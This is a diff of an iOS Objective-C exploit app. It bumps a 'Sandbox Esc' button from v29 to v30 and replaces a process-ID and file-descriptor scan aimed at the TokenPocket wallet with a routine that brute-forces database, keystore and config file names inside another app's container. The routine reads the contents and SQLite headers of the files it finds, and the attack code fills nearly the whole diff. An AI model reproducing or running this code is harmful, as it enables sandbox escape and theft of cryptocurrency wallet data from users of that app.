@@ -719,7 +719,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v29" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v30" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7431,121 +7431,150 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductVersion: %@\n", sv[@"ProductVersion"]];
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
-    // Test 11: PID neighborhood scan → proc_pidinfo FD enumeration (v29)
-    [log appendString:@"\n--- Test 11: PID scan + FD paths (v29) ---\n"];
+    // Test 11: Brute-force DB filename discovery in TP container (v30)
+    [log appendString:@"\n--- Test 11: Brute-force DB probe in TP container (v30) ---\n"];
+    NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
+    NSString *tpBase = [NSString stringWithFormat:
+        @"var/mobile/Containers/Data/Application/%@", tpUUID];
 
-    // Resolve proc_pidinfo/proc_pidfdinfo via dlsym (same as v27)
-    ProcPidinfoFn proc_pidinfo_fn = (ProcPidinfoFn)dlsym(RTLD_DEFAULT, "proc_pidinfo");
-    ProcPidfdinfoFn proc_pidfdinfo_fn = (ProcPidfdinfoFn)dlsym(RTLD_DEFAULT, "proc_pidfdinfo");
-    if (!proc_pidinfo_fn)  [log appendString:@"  [-] proc_pidinfo not available\n"];
-    if (!proc_pidfdinfo_fn)[log appendString:@"  [-] proc_pidfdinfo not available\n"];
-    if (!proc_pidinfo_fn || !proc_pidfdinfo_fn) {
-        [log appendString:@"  FATAL: required proc_* APIs unavailable\n"];
-        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
-        return;
+    // Part A: Try directory enumeration on TP cache dir (Foundation + POSIX)
+    [log appendString:@"\n[Part A] Directory enumeration on TP cache dir:\n"];
+    NSString *cacheDir = TRYFILE([tpBase stringByAppendingPathComponent:
+        @"Library/Caches/com.global.wallet.ios"]);
+    NSArray *cacheContents = [fm contentsOfDirectoryAtPath:cacheDir error:nil];
+    [log appendFormat:@"  Foundation contentsOfDir: %lu entries\n", (unsigned long)cacheContents.count];
+    if (cacheContents.count > 0) {
+        for (NSString *e in cacheContents)
+            [log appendFormat:@"    %@\n", e];
+    }
+    const char *cacheC = [cacheDir UTF8String];
+    DIR *cdp = opendir(cacheC);
+    if (cdp) {
+        [log appendString:@"  [+] POSIX opendir: SUCCESS\n"];
+        struct dirent *e; int n = 0;
+        while ((e = readdir(cdp)) && n < 100) {
+            [log appendFormat:@"    [%c] %s\n", (e->d_type==DT_DIR)?'/':((e->d_type==DT_LNK)?'@':' '), e->d_name];
+            n++;
+        }
+        closedir(cdp);
+    } else {
+        [log appendFormat:@"  [-] POSIX opendir: errno=%d (%s)\n", errno, strerror(errno)];
     }
 
-    // === Part A: PID neighborhood scan — find TokenPocket PID (v29) ===
-    [log appendString:@"\n[Part A] PID neighborhood scan (our_pid ± 60):\n"];
+    // Part B: Brute-force probe DB filenames in TP container
+    [log appendString:@"\n[Part B] Brute-force DB filename probe:\n"];
 
-    int myPid = getpid();
-    int tpPid = -1;
-    [log appendFormat:@"  Our PID: %d, scanning range [%d, %d]\n", myPid, myPid-60, myPid+60];
+    const char *baseNames[] = {
+        "wallet","wallet_data","wallet_db","tp_wallet","tpwallet","tp_data","tp_db",
+        "tron","trx","tron_wallet","trx_wallet","tron_data","tron_db","tron_token","trx_data",
+        "tokens","token_data","token_db","token_list","token_info",
+        "global","global_wallet","global_wallet_db","global_data","global_db","globalwallet",
+        "settings","preferences","config","app_config","app_data",
+        "keystore","key_data","key_store","key_info",
+        "data","database","main","app","cache","app_cache","default",
+        "eth","btc","bsc","polygon","sol","multi_chain","chain_db","chain_data",
+        "accounts","account_data","contacts","transactions","tx_history",
+        "walletdb","GlobalWalletDB","tpwalletdb","TPWalletDB",
+        "com.global.wallet.ios","Global_Wallet","global_wallet_ios",
+        "storage","store","db_main","db_wallet","db_tron","db_token",
+        "wallet_store","secure_storage","encrypted_db","secure_db",
+        "UserData","AppData","LocalData","CoreData","Model","Default",
+        NULL
+    };
+    const char *extensions[] = {".sqlite",".db",".sqlcipher",".encrypted",".sqlite3","",NULL};
+    const char *subdirs[] = {
+        "Library/Caches/com.global.wallet.ios/",
+        "Library/Caches/",
+        "Documents/",
+        NULL
+    };
 
-    int foundCount = 0;
-    for (int probePid = myPid - 60; probePid <= myPid + 60; probePid++) {
-        if (probePid <= 0) continue;
-        struct proc_bsdshortinfo info;
-        memset(&info, 0, sizeof(info));
-        int ret = proc_pidinfo_fn(probePid, PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
-        if (ret > 0 && info.pbsi_pid == probePid) {
-            const char *comm = info.pbsi_comm;
-            if (strstr(comm, "Global") || strstr(comm, "Wallet") ||
-                strstr(comm, "global") || strstr(comm, "wallet") ||
-                strstr(comm, "token") || strstr(comm, "Token")) {
-                [log appendFormat:@"  [#%d] PID=%d comm='%s' uid=%d\n",
-                    foundCount++, info.pbsi_pid, comm, info.pbsi_uid];
-                if (tpPid < 0) tpPid = info.pbsi_pid;
+    int hits = 0;
+    for (int si = 0; subdirs[si]; si++) {
+        for (int ni = 0; baseNames[ni]; ni++) {
+            for (int ei = 0; extensions[ei]; ei++) {
+                NSString *rel = [NSString stringWithFormat:@"%s/%s%s",
+                    [tpBase UTF8String], subdirs[si], baseNames[ni], extensions[ei]];
+                NSString *fpFull = TRYFILE(rel);
+                BOOL ex = [fm fileExistsAtPath:fpFull];
+                if (ex) {
+                    NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
+                    unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
+                    [log appendFormat:@"  [+] FOUND: %s%s%s (%llu bytes)\n",
+                        subdirs[si], baseNames[ni], extensions[ei], sz];
+                    hits++;
+                }
             }
         }
     }
-    [log appendFormat:@"  Scanned 121 PIDs, found %d matching\n", foundCount];
+    [log appendFormat:@"  Total hits: %d / %d probes\n",
+        hits, (int)(sizeof(baseNames)/sizeof(baseNames[0])-1) *
+              (int)(sizeof(extensions)/sizeof(extensions[0])-1) *
+              (int)(sizeof(subdirs)/sizeof(subdirs[0])-1)];
 
-    if (tpPid < 0) {
-        // Dump all successful PID queries for debugging
-        [log appendString:@"  No match. Dumping all reachable PIDs:\n"];
-        for (int probePid = myPid - 60; probePid <= myPid + 60; probePid++) {
-            if (probePid <= 0) continue;
-            struct proc_bsdshortinfo info;
-            memset(&info, 0, sizeof(info));
-            int ret = proc_pidinfo_fn(probePid, PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
-            if (ret > 0 && info.pbsi_pid == probePid && strlen(info.pbsi_comm) > 0)
-                [log appendFormat:@"    PID=%d '%s' uid=%d\n", info.pbsi_pid, info.pbsi_comm, info.pbsi_uid];
-        }
-        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
-        return;
-    }
-    [log appendFormat:@"  [+] Target PID: %d\n", tpPid];
-
-    // === Part B: List TokenPocket's open file descriptors ===
-    [log appendString:@"\n[Part B] Listing TokenPocket open FDs:\n"];
-    int fdBytes = proc_pidinfo_fn(tpPid, PROC_PIDLISTFDS, 0, NULL, 0);
-    [log appendFormat:@"  PROC_PIDLISTFDS size query: %d bytes\n", fdBytes];
-    if (fdBytes <= 0) {
-        [log appendFormat:@"  [-] PROC_PIDLISTFDS failed (errno=%d)\n", errno];
-        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
-        return;
-    }
-
-    int numFds = fdBytes / sizeof(struct proc_fdinfo);
-    struct proc_fdinfo fdList[numFds];
-    memset(fdList, 0, sizeof(fdList));
-    int fdGot = proc_pidinfo_fn(tpPid, PROC_PIDLISTFDS, 0, fdList, sizeof(fdList));
-    if (fdGot <= 0) {
-        [log appendFormat:@"  [-] PROC_PIDLISTFDS data fetch failed\n"];
-        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
-        return;
-    }
-    numFds = fdGot / sizeof(struct proc_fdinfo);
-    [log appendFormat:@"  Got %d FDs\n", numFds];
-
-    // === Part C: Get vnode path for each FD (filter interesting) ===
-    [log appendString:@"\n[Part C] FD → vnode paths (interesting only):\n"];
-    int interesting = 0;
-    for (int i = 0; i < numFds; i++) {
-        int fd = fdList[i].proc_fd;
-        uint32_t fdtype = fdList[i].proc_fdtype;
-        struct vnode_fdinfowithpath vinfo;
-        memset(&vinfo, 0, sizeof(vinfo));
-        int vret = proc_pidfdinfo_fn(tpPid, fd, PROC_PIDFDVNODEPATHINFO, &vinfo, sizeof(vinfo));
-        if (vret > 0 && vinfo.len > 0 && strlen(vinfo.path) > 0) {
-            BOOL isInteresting = (
-                strstr(vinfo.path, ".db") || strstr(vinfo.path, ".sqlite") ||
-                strstr(vinfo.path, ".sqlcipher") || strstr(vinfo.path, ".encrypted") ||
-                strstr(vinfo.path, "Library/Caches") || strstr(vinfo.path, "Documents/db") ||
-                strstr(vinfo.path, "Documents") || strstr(vinfo.path, "Preferences") ||
-                strstr(vinfo.path, "global") || strstr(vinfo.path, "wallet") ||
-                strstr(vinfo.path, "token") || strstr(vinfo.path, "keypal") ||
-                strstr(vinfo.path, "tron") || strstr(vinfo.path, "TRON")
-            );
-            if (isInteresting) {
-                [log appendFormat:@"  [*] FD=%d type=%u path=%s\n", fd, fdtype, vinfo.path];
-                interesting++;
+    // Part C: Also probe .plist and .json files for path references
+    [log appendString:@"\n[Part C] Probe config/plist/json files:\n"];
+    const char *configNames[] = {
+        ".plist","Info.plist","config.plist","settings.plist","manifest.plist",
+        "config.json","settings.json","app.json","manifest.json","package.json",
+        "db_config.json","wallet_config.json",
+        NULL
+    };
+    for (int si = 0; subdirs[si]; si++) {
+        for (int ni = 0; configNames[ni]; ni++) {
+            NSString *rel = [NSString stringWithFormat:@"%s/%s%s",
+                [tpBase UTF8String], subdirs[si], configNames[ni]];
+            NSString *fpFull = TRYFILE(rel);
+            BOOL ex = [fm fileExistsAtPath:fpFull];
+            if (ex) {
+                NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
+                unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
+                [log appendFormat:@"  [+] CONFIG: %s%s (%llu bytes)\n", subdirs[si], configNames[ni], sz];
+                // Try to read contents
+                NSError *err = nil;
+                NSString *content = [NSString stringWithContentsOfFile:fpFull encoding:NSUTF8StringEncoding error:&err];
+                if (content) {
+                    [log appendFormat:@"      content: %@\n",
+                        [content substringToIndex:MIN(500, content.length)]];
+                }
+                hits++;
             }
         }
     }
-    [log appendFormat:@"  Interesting paths found: %d\n", interesting];
+    [log appendFormat:@"  Config hits: %d\n", hits];
 
-    // === Part D: Dump ALL vnode paths (unfiltered) ===
-    [log appendString:@"\n[Part D] ALL FD paths (unfiltered):\n"];
-    for (int i = 0; i < numFds; i++) {
-        int fd = fdList[i].proc_fd;
-        uint32_t fdtype = fdList[i].proc_fdtype;
-        struct vnode_fdinfowithpath vinfo;
-        memset(&vinfo, 0, sizeof(vinfo));
-        int vret = proc_pidfdinfo_fn(tpPid, fd, PROC_PIDFDVNODEPATHINFO, &vinfo, sizeof(vinfo));
-        if (vret > 0 && vinfo.len > 0 && strlen(vinfo.path) > 0) {
-            [log appendFormat:@"  FD=%d type=%u -> %s\n", fd, fdtype, vinfo.path];
+    // Part D: Probe raw SQLite header magic to identify databases
+    [log appendString:@"\n[Part D] SQLite magic probe on cache dir files:\n"];
+    const char *sqliteMagic = "SQLite format 3";
+    // Try common single-word filenames without extension in the bundle-id dir
+    const char *quickNames2[] = {
+        "wallet","Wallet","WALLET","tpwallet","TPWallet","TP_Wallet",
+        "global","Global","GLOBAL","global_wallet","GlobalWallet",
+        "tron","TRON","Tron","trx","TRX",
+        "eth","ETH","btc","BTC","sol","SOL",
+        "data","Data","DATA","db","DB",
+        "keystore","KeyStore","key_store",
+        "accounts","Accounts","tokens","Tokens",
+        NULL
+    };
+    for (int ni = 0; quickNames2[ni]; ni++) {
+        NSString *rel = [NSString stringWithFormat:@"%s/Library/Caches/com.global.wallet.ios/%s",
+            [tpBase UTF8String], quickNames2[ni]];
+        NSString *fpFull = TRYFILE(rel);
+        BOOL ex = [fm fileExistsAtPath:fpFull];
+        if (ex) {
+            NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
+            unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
+            // Read first 16 bytes to check SQLite magic
+            int fd = open([fpFull UTF8String], O_RDONLY);
+            char hdr[16] = {0};
+            if (fd >= 0) { read(fd, hdr, 16); close(fd); }
+            BOOL isSQLite = (memcmp(hdr, sqliteMagic, 16) == 0);
+            [log appendFormat:@"  [%s] %s (%llu bytes) hdr=%02x%02x%02x%02x...\n",
+                isSQLite ? "SQLITE" : "FILE  ", quickNames2[ni], sz,
+                (unsigned char)hdr[0], (unsigned char)hdr[1],
+                (unsigned char)hdr[2], (unsigned char)hdr[3]];
+            hits++;
         }
     }
 
